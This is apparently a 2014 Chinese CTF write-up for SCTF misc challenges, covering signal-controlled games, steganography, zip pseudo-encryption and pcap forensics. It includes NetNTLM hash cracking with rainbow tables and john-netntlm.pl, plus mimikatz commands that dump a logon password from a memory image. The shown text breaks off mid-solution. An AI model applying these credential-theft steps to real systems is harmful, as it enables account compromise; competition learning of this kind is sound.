<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />	
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="renderer" content="webkit">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<title>SCTF Writeup - SecPulse.COM | 安全脉搏</title>
<meta name="description" content="Misc10" />
<meta name="keywords" content="challenge,file.sycsec.com,foremost,halflmchall,happy_net@163.com,http://report-man.sycsec.com/login.php,JJBoom,john-ntlm.pl,jphide,LateRain,MDMP,mimikatz,minecraft,Misc,Misc10,Misc100,MISC200,modx,modx.sycsec.com,mp3stego,NETLMIS,NetLMis666,rcracki_mt,report-man.sycsec.com,SCTF,SCTF Writeup,sekurlsa::logonPasswords full,sekurlsa::minidump,smb劫持攻击,smb协议,stegdetect,SYC071,SYC083,writeup,xiaojing@sycsec.com,zip伪加密,二次元,代码审计,内网攻击数据包分析,密钥,手持两把锟斤拷，口中疾呼烫烫烫,脚踏千朵屯屯屯，笑看万物锘锘锘,萌妹子,贪吃蛇,隐写" />

<link rel='stylesheet' id='style-css'  href='https://www.secpulse.com/wp-content/themes/sec/style.css?ver=2014.9.21' type='text/css' media='all' />
<link rel='stylesheet' id='jquery.fancybox-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/jquery.fancybox.css?ver=1.0' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/font-awesome.min.css?ver=1.0' type='text/css' media='all' />
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.min.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.fancybox.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/helpers/jquery.fancybox-buttons.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.mousewheel-3.0.6.pack.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/owl.carousel.min.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/custom.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/comments-ajax.js?ver=1.3'></script>
<link rel='canonical' href='https://www.secpulse.com/archives/2926.html' />
<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="http://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
<script src="http://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?7f4cc5524dcb1aec487b4266c18bae48";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


</head>
<body class="single single-post postid-2926 single-format-standard">
	<header id="header" class="header clr">
		<div class="header-top inner clr">
	<hgroup class="logo-main"><h1 class="logo"><a href="https://www.secpulse.com/" rel="home" title="安全脉搏">安全脉搏</a></h1><h4 class="xs-hidden">分享技术，悦享品质 
	</h4>
	</hgroup>

<div class="login xs-hidden">
				<div class="logindiv">
					<div class="img">
<img src="https://www.secpulse.com/wp-content/uploads/2017/05/rabbit.jpeg" width="36" height="36" alt="" class="avatar avatar-36 wp-user-avatar wp-user-avatar-36 photo avatar-default" /></div><span href="javascript:void(0);" title="用户" class="yh">用户</span><i
						class="fa fa-caret-down fa-2"></i>
					<ul class="login-links">
						<li class="log"><a
							href="https://www.secpulse.com/wp-login.php"
							target="_blank"><i class="fa fa-arrow-right"></i><span>登陆</span></a></li>
						<li class="exit"><a
							href="https://www.secpulse.com/wp-login.php?action=register"><i
								class="fa fa-user-times"></i><span>注册</span></a></li>
					</ul>
	
  </div>
			</div>
			<div class="top-search xs-hidden">
  <form id="search" method="get" action="https://www.secpulse.com" >
	<input type="text" name="s" id="s" autocomplete="off"  placeholder="输入搜索内容">
	<button class="btn-search"> <i class="fa fa-search"></i></button>
</form></div>
			<div class="menu-button">
				<i class="fa fa-bars fa-3x"></i>
			</div>
		</div>


		<div class="main-nav  xs-hidden">
			<div class="inner clr"><nav class="left-nav clr"><ul id="menu-%e5%af%bc%e8%88%aa" class="header-menu-nav"><li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li id="menu-item-17" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li id="menu-item-34048" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li id="menu-item-34047" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li id="menu-item-34046" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li id="menu-item-34565" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li id="menu-item-34568" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li id="menu-item-35948" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li id="menu-item-35949" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li id="menu-item-35950" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li id="menu-item-35951" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li id="menu-item-35952" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li id="menu-item-35953" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li id="menu-item-18" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li id="menu-item-35956" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li id="menu-item-35957" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li id="menu-item-379" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li id="menu-item-51480" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li id="menu-item-54332" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li id="menu-item-35955" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li id="menu-item-54333" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li id="menu-item-368" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li id="menu-item-35947" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li id="menu-item-35954" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li id="menu-item-50217" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li id="menu-item-51479" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li id="menu-item-16" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li id="menu-item-52" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li id="menu-item-6645" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>  <nav class="right-nav clr "><ul id="menu-%e5%af%bc%e8%88%aa%e4%ba%8c" class="header-menu-nav"><li id="menu-item-33967" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33967"><a title="付费渗透测试" href="http://service.secpulse.com">安全服务</a></li>
<li id="menu-item-52043" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52043"><a title="安全从业者最实用的安全导航" href="http://nav.secpulse.com">安全导航</a></li>
<li id="menu-item-33966" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33966"><a title="安识科技" href="https://www.duoyinsu.com">多因素</a></li>
</ul></nav></div>
		</div>
		<div class="nav-bg"></div>
   <nav class="mini-nav visible-xs"><ul id="menu-%e5%af%bc%e8%88%aa-1" class="menu-mini-nav"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>     </header><section class="xs-main index-main clr">
<div class="inner">
<div class="xs-left">
<nav class="crumbs">现在位置： <a title="返回首页" href="https://www.secpulse.com">首页</a> &gt; <a href="https://www.secpulse.com/archives/category/exclusive">独家</a> &gt; <a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup" rel="category tag">CTF</a> &gt;  正文 </nav><article id="post-2926" class="post-2926 post type-post status-publish format-standard hentry category-ctf-writeup tag-challenge tag-file-sycsec-com tag-foremost tag-halflmchall tag-happy_net163-com tag-httpreport-man-sycsec-comlogin-php tag-jjboom tag-john-ntlm-pl tag-jphide tag-laterain tag-mdmp tag-mimikatz tag-minecraft tag-misc tag-misc10 tag-misc100 tag-misc200 tag-modx tag-modx-sycsec-com tag-mp3stego tag-netlmis tag-netlmis666 tag-rcracki_mt tag-report-man-sycsec-com tag-sctf tag-sctf-writeup tag-sekurlsalogonpasswords-full tag-sekurlsaminidump tag-smb tag-stegdetect tag-syc071 tag-syc083 tag-writeup tag-xiaojingsycsec-com tag-zip tag-886 tag-code-audit tag-895 tag-909 tag-880 tag-881 tag-887 tag-883 tag-892">
	<header class="single-header">
		<h1>SCTF Writeup</h1>
			<div class="single-meta">
				
		    <div class="time"><i></i> <a href="javascript:void(0);">2014 /12/9 13:19</a></div>
			<div class="eye xs-hidden"><i class="fa fa-eye fa-1"></i><a href="javascript:void(0);">17,888</a> </div>			<div class="comments xs-hidden"><i class="fa fa-comments fa-1"></i><a href="https://www.secpulse.com/archives/2926.html#comments">评论 1 条</a></div>
			
			
		</div>
		<!-- .entry-meta -->
	</header>
	<!-- .single-header -->

	<div class="single-main">
		<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_01.png"><img class="alignnone size-full wp-image-2930" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_01.png" alt="sctf_writeup_01" width="712" height="297" /></a></p>
<h2>Misc10</h2>
<p>手持两把锟斤拷，口中疾呼烫烫烫<br />
下联是什么呢？<br />
Score: 10<br />
Ratio: 8/659<br />
Remain: 0/30</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_02.png"><img class="alignnone size-full wp-image-2929" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_02.png" alt="sctf_writeup_02" width="797" height="155" /></a></p>
<p>百度得知 http://www.zhihu.com/question/19909094/answer/28933117</p>
<p>手持两把锟斤拷，口中疾呼烫烫烫<br />
脚踏千朵屯屯屯,笑看万物锘锘锘  (X)<br />
<span style="color: #ff0000;">脚踏千朵屯屯屯，笑看万物锘锘锘</span> (√）</p>
<p>注意中文符号。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/misc10.png"><img class="alignnone size-full wp-image-3082" src="http://www.secpulse.com/wp-content/uploads/2014/12/misc10.png" alt="misc10" width="683" height="340" /></a></p>
<h2>Misc100</h2>
<p>简单的贪吃蛇，吃到30分它就告诉你flag！但是要怎么控制它呢? <a href="http://download.sycsec.com/misc/b2e387e6a7a498eafa22915cd7ddcd85.zip" target="_blank">Download</a><br />
Score: 100<br />
Ratio: 0/659<br />
Remain: 0/30</p>
<p>&nbsp;</p>
<p>对bin文件进行分析，发现在主框架中通过signal函数注册了几个信号，其中’2’,’4’,’6’,’8’分别用于控制下、左、上、右四个方向，SIGALRM用于处理游戏的主要业务逻辑。至于SIGTRAP，则是在handler里面留了个个int 3的断点，简单的反调试罢了，SIGTRAP的信号处理逻辑为直接执行一个空函数。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/misc100.png"><img class="alignnone size-full wp-image-3127" src="http://www.secpulse.com/wp-content/uploads/2014/12/misc100.png" alt="misc100" width="545" height="226" /></a></p>
<p>所以我们可以写一个程序，通过发送信号的方式来控制按键。Linux下C语言可以使用kill函数对指定的pid发送信号，而pid则可以通过执行命令得到（ps/grep/awk），为了完美接收键盘控制信息，我这里使用了curses来接收按键操作，这样直接按方向键就好了。</p>
<pre class="lang:c decode:true ">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;curses.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;signal.h&gt;
 
int getPid()
{
    FILE *fp = NULL;
    fp = popen("ps -e|grep \'snake\'|awk \'{print $1}\'", "r");
    int pid = -1;
    if (EOF == fscanf(fp, "%d", &amp;pid)) pid = -1;
    pclose(fp);
    return pid;
}
 
int main(int argc, char** argv)
{
    int ch;
    int pid = -1;
 
    while (pid == -1) pid = getPid();
    printf("pid = %d\n", pid);
    initscr();
    cbreak();
    noecho();
    keypad(stdscr, true);
    while (1)
    {
        ch = getch();
        if (ch == KEY_UP) ch = '8';
        else if (ch == KEY_DOWN) ch = '2';
        else if (ch == KEY_LEFT) ch = '4';
        else if (ch == KEY_RIGHT) ch = '6';
        kill(pid, ch);
    }
    endwin();
 
    return 0;
}
/*
    g++ -o ctrl ctrl.cpp -lncurses
    U0NURntzMWduNGxfMXNfZnVubnk6KX0=
    SCTF{s1gn4l_1s_funny:)}
*/</pre>
<p>&nbsp;</p>
<h2>MISC200</h2>
<p>二次元的萌妹子，你肯定会喜欢的! <a href="http://download.sycsec.com/misc/1a94c77f102ab4f6263d72347ce7d0dd.jpg" target="_blank">Download</a><br />
Score: 200<br />
Ratio: 0/659<br />
Remain: 0/30</p>
<p><span style="color: #ff9900;">2014-12-07 15:12:35 [Misc200更新] Misc200文件更新了，完善了题目，方法没变</span></p>
<div id="cha_content">A-Cup的妹子，你肯定看腻了。我们换一个C-cup<br />
题目的做法没有改变，只是之前的题有另类解法，所以完善了题目。<br />
<a href="http://download.sycsec.com/misc/1a94c77f102ab4f6263d72347ce7d0dd.zip" target="_blank">Download</a><br />
tips:密钥即为文件名</div>
<div id="cha_score">Score: 200</div>
<div id="cha_ratio">Ratio: 9/659</div>
<div id="cha_remain">Remain: 0/30</div>
<p>&nbsp;</p>
<div><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_04.png"><img class="alignnone size-full wp-image-2942" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_04.png" alt="sctf_writeup_04" width="797" height="215" /></a></div>
<div>
<p>下载得到一个压缩包，里面有张图片，丢hex工具查看。<a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_05.png"><img class="alignnone size-full wp-image-2944" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_05.png" alt="sctf_writeup_05" width="1006" height="505" /></a>发现存在zip压缩包，于是用foremost分离得到以下文件</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_06.png"><img class="alignnone size-full wp-image-2946" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_06.png" alt="sctf_writeup_06" width="437" height="124" /></a></p>
<p>第一天时zip存在解压密码，3.jpg用stegdetect发现jphide隐写，尝试无果，直接到第二天出现新提示。</p>
<p><strong>tips:</strong><strong>密钥即为文件名</strong></p>
<p>于是尝试用mp3stego，sctf解压4.zip发现不成功，猜想其他解法。查阅资料发现zip伪加密。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_07.png"><img class="alignnone size-full wp-image-2947" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_07.png" alt="sctf_writeup_07" width="531" height="31" /></a></p>
<p>这是一个无密码的zip文件</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_08.png"><img class="alignnone size-full wp-image-2948" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_08.png" alt="sctf_writeup_08" width="533" height="57" /></a></p>
<p>这是本题的zip，可以发现在</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_09.png"><img class="alignnone size-full wp-image-2949" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_09.png" alt="sctf_writeup_09" width="396" height="78" /></a></p>
<p>存在区别，于是尝试把01-&gt;00，再尝试打开，没有提示输入密码成功解压得到mp3stego。</p>
<p>用mp3stego工具对文件进行解密。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_10.png"><img class="alignnone size-full wp-image-2950" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_10.png" alt="sctf_writeup_10" width="649" height="271" /></a></p>
<p>此处密码为sctf（最初jpg的文件名）。</p>
<p>得到</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_11.png"><img class="alignnone size-full wp-image-2952" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_11.png" alt="sctf_writeup_11" width="701" height="65" /></a></p>
<p>玩过MC的一看端口便知道这是minecraft开放的端口，下面应该就是flag的坐标。</p>
<p>附图：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_12.png"><img class="alignnone size-full wp-image-2953" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_12.png" alt="sctf_writeup_12" width="1534" height="780" /></a></p>
<div></div>
<p>&nbsp;</p>
<h2>Misc300</h2>
<div id="cha_content">内网攻击数据包分析<br />
FLAG格式: SCTF{syclover用户的明文} <a href="http://download.sycsec.com/misc/b48d97c14a09217ee8cc1d586ca14e2f.pcap" target="_blank">Download</a></div>
<div id="cha_score">Score: 300</div>
<div id="cha_ratio">Ratio: 35/659</div>
<div id="cha_remain">Remain: 0/30</div>
<div></div>
<div></div>
<div>
<p>下载后发现这个包很小，主要关注到smb协议的数据包。按照题目的意思，需要获取到syclover的明文密码，这应该就是一个<span style="color: #ff9900;">内网的smb劫持攻击</span>了，查看了smb包里面的challenge值确实也是1122334455667788</p>
</div>
</div>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_13.png"><img class="alignnone size-full wp-image-2956" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_13.png" alt="sctf_writeup_13" width="684" height="270" /></a></p>
<p>抓到hash是：</p>
<p>LMHASH:9e94258a03356914b15929fa1d2e290fab9c8f9f01999448</p>
<p>NTHASH:013f3cb06ba848f98a6ae6cb4a76477c5ba4e45cda73b475</p>
<p>去下载了个16G的彩虹表。</p>
<p>开始halflmchall hash攻击。</p>
<p>使用工具rcracki_mt先猜解前几位（不区分大小写）很快破解出结果</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_14.png"><img class="alignnone size-full wp-image-2958" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_14.png" alt="sctf_writeup_14" width="581" height="355" /></a></p>
<p>前七位：NETLMIS</p>
<p>接下来<span style="color: #ff9900;">继续使用破解出来的字符串做种子破解整个密码</span>，使用到john-ntlm.pl,</p>
<p>现将hash保存成如下格式：</p>
<p>syclover::ROOT-53DD5427BC:013f3cb06ba848f98a6ae6cb4a76477c5ba4e45cda73b475:9e94258a03356914b15929fa1d2e290fab9c8f9f01999448:1122334455667788</p>
<p>执行：</p>
<p>./john-netntlm.pl  --seed "NETLMIS" --file /tmp/1.txt</p>
<p>得到最终的用户密码为：</p>
<p>NetLMis666</p>
<p>那么FLAG:</p>
<p>SCTF{NetLMis666}</p>
<p>本解题方法大量参考看雪某文章，原帖贴出：</p>
<p><a href="http://bbs.pediy.com/showthread.php?p=1203990" target="_blank">http://bbs.pediy.com/showthread.php?p=1203990</a></p>
<p>&nbsp;</p>
<h2>Misc400a</h2>
<div id="cha_content">这是捕获的黑客攻击数据包，LateRain用户的密码在此次攻击中泄露了，你能找到吗？<br />
FLAG格式：SCTF{LateRain的明文密码}<br />
<a href="http://download.sycsec.com/misc/ca7ddad530b04af3b3486a5c75fcf18b.zip" target="_blank">Download</a></div>
<div id="cha_score">Score: 400</div>
<div id="cha_ratio">Ratio: 15/659</div>
<div id="cha_remain">Remain: 0/30</div>
<div></div>
<div></div>
<div>
<p>下载了数据包，发现数据量很多。经过剔除，可以发现里面有少量http包。估计pcap包中大量的tcp数据是为了做炮灰的。</p>
<p>一个http数据包的内容如下：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_15.png"><img class="alignnone size-full wp-image-2962" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_15.png" alt="sctf_writeup_15" width="765" height="459" /></a></p>
<p>明眼人一眼看出这应该是个菜刀的数据包，config.php应该是被入侵后的一句话木马。</p>
<p>整个pcap中大概就几十条http的数据流，一条一条看下来。发现入侵者用winrar打包了一个文件，然后下载了该文件。</p>
<p>用wireshark可以直接提取出该rar文件。</p>
<p>而这是一个加密的rar文件，将菜刀post过去的关键数据base64解密一下，发现使用了该命令打包。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_16.png"><img class="alignnone size-full wp-image-2964" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_16.png" alt="sctf_writeup_16" width="747" height="516" /></a></p>
<p>C:\progra~1\WinRAR\rar a C:\Inetpub\wwwroot\backup\wwwroot.rar C:\Inetpub\wwwroot\backup\1.gif –hpJJBoom</p>
<p>密码就是JJBoom</p>
<p>解开压缩包得到一个1.gif,使用c32asm打开，</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_17.png"><img class="alignnone size-full wp-image-2966" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_17.png" alt="sctf_writeup_17" width="604" height="311" /></a></p>
<p><span style="color: #ff9900;">根据文件头MDMP，知道这是一个内存的dump文件</span>。</p>
<p>载入到神器mimikatz中</p>
<p>使用两条命令</p>
<p>mimikatz # sekurlsa::minidump 1.dmp</p>
<p>//载入dmp文件</p>
<p>mimikatz # sekurlsa::logonPasswords full</p>
<p>//读取登陆密码</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_18.png"><img class="alignnone size-full wp-image-2968" src="http://www.secpulse.com/wp-content/uploads/2014/12/sctf_writeup_18.png" alt="sctf_writeup_18" width="645" height="196" /></a></p>
<p>密码是&lt;TAB&gt;&lt;SPACE&gt;。</p>
<p>但是这不是flag。。</p>
<p>因为&lt;TAG&gt;&lt;SPACE&gt;后面还有空格。。</p>
<p>要先log，把输出都输出到一个txt里查看。</p>
